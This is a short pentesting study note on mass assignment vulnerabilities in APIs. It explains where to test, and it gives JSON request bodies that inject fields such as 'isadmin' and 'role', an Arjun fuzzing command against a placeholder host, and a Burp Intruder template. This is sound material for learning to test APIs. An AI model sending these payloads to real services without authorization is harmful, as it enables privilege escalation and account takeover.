occurs when an API consumer includes more parameters[`"isadmin": true`] in their requests than the application intended and the application adds these parameters to code variables or internal objects
common places to test for this vuln: Account registration, profile editing, user management, and client management, any update function such updating account, group, or company profiles;
##### to test for it all u need is find these parameters 
- find interesting parameters in API documentation and then adding those parameters to a request
- parameters involved in user account properties, critical functions, and administrative actions
- Intercept API requests and responses could also reveal parameters worthy of testing 
- fuzzing Unknown Variables: trigger actions from web app, intercept the request, then fuzz the values of that request, ex:
```json
{ "username": "hapi_hacker", "pass": "ff7ftw", "uam": 1, "mfa": true, account": 101}
 /* fuzz 'uam' from 0->1
fuzz mfa, and fuzz account from 0->101
*/
```
- Blind Mass Assignment:  Send a single request with many possible variables
```json
{ "username":"hAPI_hacker", 
 "email":"hapi@hacker.com", 
 "admin": true,  "admin":1,  "isadmin": true,  "role":"admin", "role":"administrator", "user_priv": "admin", 
 "password":"Password1!" }
```
##### Automating Mass Assignment Attacks
###### Arjun 
```bash
$arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
# if you run into issues with rate limiting, use -stable 
```
- arjun can make lot of false positive, because of arjun narrow down likely parameters based on deviations of response lengths and response codes
- also sending one request with many parameters can cause: 400(Bad Request), 413(Payload Too Large), for this we can use **Burp suite intruder**
###### Burp suite intruder
```json
{ "username":"hAPI_hacker", 
 "email":"hapi@hacker.com", 
 §"admin": true§, 
 "password":"Password1!" 
 }
```


> [!NOTE] Title
> - If you are able to perform a mass assignment, then there is a chance that the parameter or parameters that you can alter may not be protected from injection attacks and/or Server-side Request Forgery. When you have discovered mass assignment fuzz the parameter for other weaknesses.

